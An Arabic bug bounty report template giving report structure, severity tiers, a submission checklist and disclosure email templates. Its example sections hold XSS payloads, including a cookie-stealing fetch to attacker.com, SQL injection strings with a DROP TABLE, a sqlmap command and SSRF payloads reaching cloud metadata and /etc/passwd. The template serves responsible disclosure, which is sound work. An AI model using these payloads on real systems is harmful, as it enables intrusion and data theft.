<a id="-bug-bounty-report-template"></a>
# 🐛 قالب تقرير مكافآت اكتشاف الثغرات (Bug Bounty)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

> **إرشادات القالب:** استبدل النصوص بين الأقواس المربعة ببيانات تقريرك؛ حُفظت رموز الحقول الإنجليزية والقيم والأوامر كما في الأصل. الأرقام والإصدارات والمبالغ والدرجات أمثلة توضيحية، وليست نتائج تقييم فعلي أو معايير ملزمة. الرسوم ثابتة العرض بالإنجليزية للحفاظ على اصطفافها، وتوضحها الفقرات والجداول العربية.


[🇹🇷 Türkçe Sürüm](Bug-Bounty-Report-Template.tr.md) • [🇬🇷 Ελληνικά](Bug-Bounty-Report-Template.el.md)

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗
██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║   
██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║   
██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   
╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
```

---

<a id="-quick-template"></a>
## 🎯 قالب سريع

````markdown
## الملخص
[One-line description of the vulnerability]

## الخطورة
[Critical/High/Medium/Low] - CVSS: X.X

## نوع الثغرة
[XSS/SQLi/IDOR/SSRF/etc.]

## الرابط أو نقطة النهاية (URL/Endpoint)
`https://example.com/vulnerable-endpoint`

## خطوات إعادة الإنتاج
1. الخطوة 1
2. الخطوة 2
3. الخطوة 3

## الأثر
[What an attacker can achieve]

## إثبات المفهوم (PoC)
[Code/Screenshots/Video]

## المعالجة
[How to fix it]
````

---

<a id="-full-report-template"></a>
## 📝 قالب التقرير الكامل

<a id="title-format"></a>
### صيغة العنوان
```
[Severity] [Vulnerability Type] في [Feature/Endpoint] تتيح [Impact]

أمثلة:
- [Critical] حقن SQL في نموذج تسجيل الدخول يتيح استخراج قاعدة البيانات
- [High] ثغرة XSS مخزنة في التعليقات تتيح الاستيلاء على الحساب
- [Medium] ثغرة IDOR في /api/users/{id} تكشف معلومات تعريف شخصية لمستخدمين آخرين
```

---

<a id="-detailed-report-structure"></a>
## 📋 بنية التقرير التفصيلية

````markdown
# [Vulnerability Type] في [Feature/Endpoint]

## الملخص
اكتُشفت ثغرة من نوع [vulnerability type] في [feature/endpoint] 
تتيح للمهاجم [impact]. تؤثر هذه الثغرة في [scope/users].

## تقييم الخطورة

| المقياس | القيمة |
|--------|-------|
| **الخطورة** | حرجة / عالية / متوسطة / منخفضة |
| **درجة CVSS** | X.X |
| **متجه CVSS** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-XXX: [CWE Name] |

## تفاصيل الثغرة

### الأصل المتأثر
- **URL:** `https://example.com/path/to/endpoint`
- **المعامل:** `parameter_name`
- **طريقة الطلب:** GET/POST
- **المصادقة:** مطلوبة/غير مطلوبة

### الشيفرة أو الإعدادات المعرضة للاستغلال
[If visible/applicable]

## خطوات إعادة الإنتاج

### المتطلبات المسبقة
- حساب مطلوب: نعم/لا
- الوصول الخاص المطلوب: [describe]
- المتصفح أو الأداة: [specify]

### خطوات إعادة الإنتاج

1. **انتقل إلى نقطة النهاية المعرضة للاستغلال**
   ```
   https://example.com/vulnerable-page
   ```

2. **أدخل الحمولة**
   ```
   [Payload here]
   ```

3. **لاحظ النتيجة**
   - [What happens]

### طلب HTTP
```http
POST /api/endpoint HTTP/1.1
Host: example.com
Content-Type: application/json
Cookie: session=abc123

{
  "parameter": "malicious_payload_here"
}
```

### استجابة HTTP
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "result": "vulnerable_response"
}
```

## إثبات المفهوم (PoC)

### الحمولة المستخدمة
```
[Your payload here]
```

### أدلة بلقطات الشاشة
![الوصف](attachment_url)

### إثبات المفهوم بالفيديو
[Link to video demonstration]

### سكربت آلي لإثبات المفهوم (اختياري)
```python
import requests

url = "https://example.com/vulnerable"
payload = {"param": "malicious_input"}
response = requests.post(url, json=payload)
print(response.text)
```

## تقييم الأثر

### الأثر التقني
- **السرية:** [Data that can be accessed]
- **السلامة:** [Data that can be modified]
- **التوافر:** [Service disruption possible]

### الأثر على الأعمال
- [Financial impact]
- [Reputational damage]
- [Regulatory/Compliance violations]
- [Number of affected users]

### سيناريو الهجوم
يمكن للمهاجم استغلال هذه الثغرة من أجل:
1. [Specific action 1]
2. [Specific action 2]
3. [Specific action 3]

## توصيات المعالجة

### الإصلاح الفوري
[Quick fix to mitigate]

### الحل طويل الأجل
[Proper remediation]

### مثال إصلاح الشيفرة
```python
# قبل الإصلاح (معرض للاستغلال)
query = f"SELECT * FROM users WHERE id = {user_input}"

# بعد الإصلاح (مصحح)
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_input,))
```

## المراجع
- [OWASP Link]
- [CWE Link]
- [Related CVEs]
- [Blog posts/Research]

## الجدول الزمني
| التاريخ | الإجراء |
|------|--------|
| YYYY-MM-DD | اكتشاف الثغرة |
| YYYY-MM-DD | إرسال التقرير |
| YYYY-MM-DD | إقرار المورّد بالتقرير |
| YYYY-MM-DD | نشر الإصلاح |
| YYYY-MM-DD | منح المكافأة |
````

---

<a id="-templates-by-vulnerability-type"></a>
## 🔥 قوالب حسب نوع الثغرة

<a id="xss-cross-site-scripting"></a>
### البرمجة النصية عبر المواقع (XSS)

````markdown
## الملخص
تتيح ثغرة XSS منعكسة أو مخزنة في [endpoint] للمهاجمين تنفيذ 
شيفرة JavaScript يختارونها داخل متصفحات الضحايا.

## الحمولة
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

## الأثر
- اختطاف الجلسة عبر سرقة ملفات تعريف الارتباط
- الاستيلاء على الحساب
- تسجيل ضغطات المفاتيح
- هجمات التصيد الاحتيالي
- توزيع البرمجيات الضارة

## إثبات المفهوم (PoC)
```javascript
// سرقة ملفات تعريف الارتباط
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```
````

<a id="sql-injection"></a>
### حقن SQL

````markdown
## الملخص
يسمح حقن SQL في [parameter] عند [endpoint] باستخراج محتويات قاعدة البيانات.

## الحمولة
```sql
' OR '1'='1'--
' UNION SELECT username,password FROM users--
1; DROP TABLE users--
```

## الأدلة
- قاعدة البيانات: MySQL 8.0
- الجداول المستخرجة: users, orders, payments
- السجلات التي يمكن الوصول إليها: 10,000+

## أمر SQLMap
```bash
sqlmap -u "https://example.com/page?id=1" --dbs --batch
```
````

<a id="idor-insecure-direct-object-reference"></a>
### مرجع مباشر غير آمن لكائن (IDOR)

````markdown
## الملخص
تتيح ثغرة IDOR في [endpoint] الوصول إلى [resource] الخاصة بمستخدمين آخرين.

## إعادة الإنتاج
1. سجّل الدخول باسم المستخدم A (ID: 100)
2. افتح: `GET /api/users/100/profile`
3. غيّر المعرّف إلى 101: `GET /api/users/101/profile`
4. لاحظ إرجاع بيانات المستخدم B

## الأثر
- كشف معلومات تعريف شخصية: الاسم والبريد الإلكتروني والعنوان
- إمكانية الوصول إلى بيانات [X] من المستخدمين
- مخالفة GDPR أو متطلبات الخصوصية

## الأدلة
| الطلب | الاستجابة |
|---------|----------|
| `/api/users/100` | بيانات المستخدم A ✓ |
| `/api/users/101` | بيانات المستخدم B ✗ |
| `/api/users/102` | بيانات المستخدم C ✗ |
````

<a id="ssrf-server-side-request-forgery"></a>
### تزوير الطلبات من جانب الخادم (SSRF)

````markdown
## الملخص
تتيح ثغرة SSRF في [feature] إرسال طلبات إلى خدمات داخلية.

## الحمولة
```
https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
https://example.com/fetch?url=http://localhost:6379/
https://example.com/fetch?url=file:///etc/passwd
```

## الموارد الداخلية التي تم الوصول إليها
- نقطة نهاية البيانات الوصفية في AWS
- خادم Redis داخلي
- نظام الملفات المحلي

## الأدلة
```
HTTP/1.1 200 OK

ami-id: ami-12345678
instance-id: i-1234567890abcdef0
```
````

<a id="authentication-bypass"></a>
### تجاوز المصادقة

````markdown
## الملخص
يتيح تجاوز المصادقة في [feature] وصولاً غير مصرح به إلى [resource].

## طريقة التجاوز
[Describe the bypass technique]

## إعادة الإنتاج
1. افتح نقطة نهاية محمية دون مصادقة
2. [Specific technique]
3. تم السماح بالوصول

## الأثر
- الوصول إلى لوحة المسؤول
- انتحال المستخدم
- التلاعب بالبيانات
````

---

<a id="-severity-guidelines"></a>
## 📊 إرشادات تصنيف الخطورة

<a id="critical-p1"></a>
### حرجة (P1)
```
- تنفيذ التعليمات البرمجية عن بُعد (RCE)
- حقن SQL مع استخراج البيانات
- تجاوز المصادقة للوصول إلى صلاحيات المسؤول
- الاستيلاء الكامل على الحساب
- التلاعب بالمدفوعات أو المعاملات المالية
- كشف معلومات التعريف الشخصية لجميع المستخدمين
```

<a id="high-p2"></a>
### عالية (P2)
```
- ثغرة XSS مخزنة ذات أثر كبير
- ثغرة IDOR تتيح الوصول إلى بيانات حساسة
- ثغرة SSRF تصل إلى خدمات داخلية
- تصعيد الصلاحيات
- كشف بيانات حساسة
```

<a id="medium-p3"></a>
### متوسطة (P3)
```
- ثغرة XSS منعكسة
- تزوير طلبات عبر المواقع (CSRF) لإجراءات حساسة
- كشف المعلومات
- تجاوز تحديد معدل الطلبات
- تثبيت الجلسة (Session Fixation)
```

<a id="low-p4"></a>
### منخفضة (P4)
```
- Self-XSS
- ثغرة IDOR تؤثر في بيانات غير حساسة
- غياب ترويسات الأمان
- رسائل خطأ تكشف تفاصيل زائدة
- حصر أسماء المستخدمين
```

---

<a id="-submission-checklist"></a>
## ✅ قائمة فحص إرسال التقرير

````markdown
## قبل الإرسال

□ عنوان واضح يصف المشكلة
□ تقييم دقيق للخطورة
□ خطوات إعادة إنتاج متتابعة
□ إثبات مفهوم صالح للعمل
□ شرح الأثر بوضوح
□ إرفاق لقطات الشاشة أو الفيديو
□ اقتراح معالجة
□ التأكد من أن الأصل ضمن النطاق
□ التأكد بالبحث من عدم تكرار التقرير
□ مراجعة اللغة والإملاء
□ حجب البيانات الحساسة
□ إدراج معلومات التواصل
````

---

<a id="-pro-tips"></a>
## 💡 نصائح عملية

<a id="dos-"></a>
### ما يُنصح به ✅
```
✓ اكتب بوضوح وإيجاز
✓ أدرج جميع التفاصيل الضرورية
✓ قدّم إثبات مفهوم صالحاً للعمل
✓ اشرح الأثر
✓ اقترح معالجة
✓ التزم بالمهنية والاحترام
✓ اتبع الإفصاح المسؤول
✓ أجب عن الأسئلة بسرعة
```

<a id="donts-"></a>
### ما ينبغي تجنبه ❌
```
✗ لا تصل إلى بيانات مستخدمين حقيقيين
✗ لا تختبر بيئة الإنتاج
✗ لا تتجاوز النطاق
✗ لا تستخدم أدوات فحص آلية دون إذن
✗ لا تفصح عن الثغرة قبل إصلاحها
✗ لا تتعامل بعدائية في مناقشة المكافأة
✗ لا ترسل تقارير مكررة
✗ لا ترسل مشكلات نظرية بلا دليل
```

---

<a id="-communication-templates"></a>
## 📧 قوالب التواصل

<a id="initial-report"></a>
### التقرير الأولي
```
مرحباً [Security Team]،

اكتشفت ثغرة من نوع [vulnerability type] وخطورتها [severity] في 
[product/feature]. تجدون التفاصيل الكاملة في تقريري.

الملخص: [One line]
الأثر: [Brief impact]
إثبات المفهوم: [Attached/Included]

يرجى إبلاغي إذا احتجتم إلى أي معلومات إضافية.

مع أطيب التحيات،
[Your name]
[HackerOne/Bugcrowd profile]
```

<a id="follow-up"></a>
### المتابعة
```
مرحباً،

أتابع معكم التقرير رقم [ID] الذي أرسلته في [date]. 
هل يمكنكم إطلاعي على مستجدات حالته؟

شكراً لكم.
```

<a id="bounty-discussion"></a>
### مناقشة المكافأة
```
شكراً لمراجعة تقريري. أرى أن تصنيف الخطورة ينبغي أن يكون 
[higher/different] للأسباب التالية:

1. [Reason 1]
2. [Reason 2]

هل يمكنكم إعادة تقييم مبلغ المكافأة؟
```

---

**العودة إلى قسم التقارير:** [📝 قوالب التقارير](../../README.md#-reporting-templates)

> **ملاحظة التصنيف:** مستويات P1–P4 في الأمثلة إرشادية؛ تُحسم الأولوية والخطورة وفق أثر الثغرة وقواعد البرنامج، ولا يكفي اسم نوع الثغرة وحده لإثبات المستوى.
